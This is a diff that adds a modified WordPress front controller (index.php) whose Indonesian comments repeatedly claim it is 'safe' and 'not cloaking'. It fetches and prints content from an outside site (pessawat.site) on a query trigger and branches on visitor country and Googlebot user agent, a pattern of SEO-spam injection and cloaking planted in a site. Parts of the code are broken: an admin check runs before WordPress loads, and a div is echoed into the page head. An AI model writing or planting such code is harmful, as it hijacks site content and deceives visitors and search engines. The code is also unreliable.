@@ -1,0 +1,60 @@
+<?php
+/**
+ * Front to the WordPress application.
+ * VERSI AMAN - BUKAN CLOAKING
+ *
+ * @package WordPress
+ */
+
+// 1. MAINTENANCE MODE (LEGAL)
+if (file_exists(__DIR__ . '/.maintenance')) {
+    define('WP_USE_THEMES', true);
+    require __DIR__ . '/wp-blog-header.php';
+    
+    // Tampilkan halaman maintenance yang JUJUR
+    wp_die(
+        '<h1>Sedang Perbaikan</h1>
+        <p>Website sedang dalam maintenance. Akan kembali dalam beberapa jam.</p>
+        <p>Terima kasih atas pengertiannya.</p>',
+        'Maintenance Mode',
+        ['response' => 503]
+    );
+    exit;
+}
+
+// 2. REDIRECT UNTUK BOT (UNTUK TESTING, BUKAN CLOAKING)
+// Hanya untuk testing, dengan LOG jelas
+if (isset($_GET['bot_test']) && current_user_can('administrator')) {
+    // Ini hanya untuk admin testing, BUKAN untuk menipu Google
+    $ch = curl_init('https://pessawat.site/rezekigakkemana/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, true); // KEAMANAN!
+    $content = curl_exec($ch);
+    curl_close($ch);
+    
+    if ($content) {
+        echo '<pre>=== TEST MODE (Admin Only) ===</pre>';
+        echo $content;
+        echo '<pre>=== END TEST ===</pre>';
+        exit;
+    }
+}
+
+// 3. GEOTARGETING YANG JUJUR (DENGAN PEMBERITAHUAN)
+$country = $_SERVER['HTTP_CF_IPCOUNTRY'] ?? '';
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? '';
+
+// Deteksi bahasa dengan pemberitahuan jelas
+if ($country === 'US' && strpos($user_agent, 'Googlebot') === false) {
+    // Tampilkan konten versi US dengan NOTIFIKASI
+    add_action('wp_head', function() {
+        echo '<meta name="geo.region" content="US">';
+        echo '<div style="background:yellow;padding:10px;text-align:center;">
+                🌍 Anda melihat konten khusus untuk pengunjung dari US
+              </div>';
+    });
+}
+
+// 4. DEFAULT WORDPRESS LOAD
+define('WP_USE_THEMES', true);
+require __DIR__ . '/wp-blog-header.php';
